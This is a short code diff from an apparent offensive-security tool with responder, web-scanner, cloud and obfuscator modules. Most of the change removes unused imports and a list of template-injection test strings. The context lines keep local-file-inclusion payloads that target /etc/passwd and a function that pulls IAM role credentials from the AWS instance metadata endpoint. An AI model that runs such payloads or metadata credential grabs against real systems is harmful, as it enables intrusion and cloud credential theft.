@@ -2,14 +2,10 @@
 # =========================================
 # Responder, Web Scanner, Cloud Modules, Cleanup, Obfuscator
 
-import json
 import os
 import random
 import re
 import subprocess
-import sys
-import socket
-import time as _time
 from pathlib import Path
 
 
@@ -150,7 +146,6 @@ def run_webscan(params: dict) -> dict:
     lfi_payloads = ["../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd%00",
                     "php://filter/convert.base64-encode/resource=index.php",
                     "file:///etc/passwd"]
-    ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
 
     # Common endpoints to scan
     endpoints = ["/", "/login", "/admin", "/api/users", "/upload", "/search",
@@ -287,7 +282,7 @@ def _attack_aws(action: str) -> dict:
             resp = urllib.request.urlopen(req, timeout=2)
             role = resp.read().decode().strip()
             req2 = urllib.request.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
-            resp2 = urllib.request.urlopen(req2, timeout=2)
+            urllib.request.urlopen(req2, timeout=2)
             results["findings"].append({"type": "imds_v1_accessible", "role": role})
             results["credentials"].append({"type": "aws_temp_creds", "role": role})
         else:
